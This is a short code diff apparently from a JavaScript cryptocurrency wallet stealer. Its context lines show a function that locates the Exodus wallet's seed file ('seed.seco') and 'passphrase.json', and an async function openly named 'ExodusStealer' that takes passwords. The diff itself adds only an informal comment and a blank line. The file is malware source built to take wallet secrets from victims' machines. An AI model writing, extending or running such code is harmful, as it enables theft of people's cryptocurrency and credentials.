@@ -47,7 +47,7 @@ function locateExodus() {
         }
 
         const seedPath = path.join(exodusDir, "seed.seco");
-        const passphrasePath = path.join(exodusDir, "passphrase.json");
+        const passphrasePath = path.join(exodusDir, "passphrase.json"); // dont try if u have sum other os 
 
         if (fs.existsSync(seedPath)) {
             return {
@@ -207,5 +207,6 @@ async function ExodusStealer(passwords) {
         console.error("----------------------");
     }
 })();
+
 
 
